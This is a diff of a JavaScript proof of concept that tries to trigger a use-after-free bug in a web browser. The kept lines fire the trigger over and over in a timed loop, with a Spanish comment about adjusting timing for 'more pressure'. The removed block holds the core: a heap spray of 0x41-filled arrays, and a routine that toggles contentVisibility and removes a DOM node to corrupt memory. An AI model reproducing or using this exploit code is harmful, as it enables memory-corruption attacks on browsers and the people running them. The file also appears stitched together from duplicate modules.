@@ -1,11 +1,10 @@
-
-
-
 function debug_log(msg) {
-  const el = document.createElement("pre");
-  el.textContent = msg;
-  el.style = "color: lime; font-family: monospace; background: #000; padding: 2px;";
-  document.body.appendChild(el);
+  const log = document.getElementById("log");
+  if (log) {
+    log.textContent += msg + "\n";
+  } else {
+    console.log(msg);
+  }
 }
 
 const container = document.querySelector(".container");
@@ -25,7 +24,6 @@ function layoutThrash() {
   const el = document.createElement("div");
   el.style.cssText = "position:absolute; left:0; top:0; width:100px; height:100px; transition:all 0.05s ease;";
   document.body.appendChild(el);
-
   let flip = false;
   for (let i = 0; i < 50; i++) {
     el.style.width = flip ? "100px" : "120px";
@@ -50,7 +48,7 @@ function repeatTrigger(count) {
   const interval = setInterval(() => {
     if (i++ >= count) return clearInterval(interval);
     triggerUAF();
-  }, 30); // Puedes ajustar este tiempo para más presión
+  }, 30);
 }
 
 const observer = new MutationObserver(() => {
@@ -63,37 +61,3 @@ if (container) {
 } else {
   debug_log("Container element not found.");
 }
-
-import { debug_log } from './module/utils.mjs';
-
-const container = document.querySelector(".container");
-const child = document.querySelector(".child");
-
-function heapSpray() {
-  let spray = [];
-  for (let i = 0; i < 10000; i++) {
-    let arr = new Uint8Array(0x1000);
-    for (let j = 0; j < arr.length; j++) {
-      arr[j] = 0x41;
-    }
-    spray.push(arr);
-  }
-  return spray;
-}
-
-export function triggerUAF() {
-  container.style.contentVisibility = "hidden";
-  child.remove();
-  setTimeout(() => {
-    container.style.contentVisibility = "auto";
-    let spray = heapSpray();
-    debug_log("UAF triggered, check for crash or memory corruption.");
-  }, 0);
-}
-
-const observer = new MutationObserver(() => {
-  debug_log("DOM tree modified, attempting UAF...");
-  triggerUAF();
-});
-
-observer.observe(container, { childList: true, subtree: true });
